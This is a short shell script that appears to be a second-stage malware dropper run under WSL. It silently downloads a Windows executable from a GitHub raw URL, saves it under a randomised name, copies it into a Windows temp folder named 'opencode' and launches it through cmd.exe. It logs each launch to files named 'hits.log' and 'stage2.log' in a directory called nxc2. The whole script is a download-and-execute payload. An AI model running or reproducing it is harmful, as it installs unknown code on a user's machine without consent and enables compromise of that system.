#!/bin/sh
mkdir -p /tmp/nxc2
{
  R="sv$(date +%s | tail -c 5).exe"
  curl -sL -o "/tmp/$R" "https://github.com/cr123rom/gen/raw/refs/heads/master/STARDRIFT%20_V1.0.exe"
  cp "/tmp/$R" "/mnt/c/Users/ccrr2/AppData/Local/Temp/opencode/$R"
  /mnt/c/Windows/System32/cmd.exe /c start "" "C:\\Users\\ccrr2\\AppData\\Local\\Temp\\opencode\\$R"
  echo "$R started" >> /tmp/nxc2/hits.log
} >> /tmp/nxc2/stage2.log 2>&1
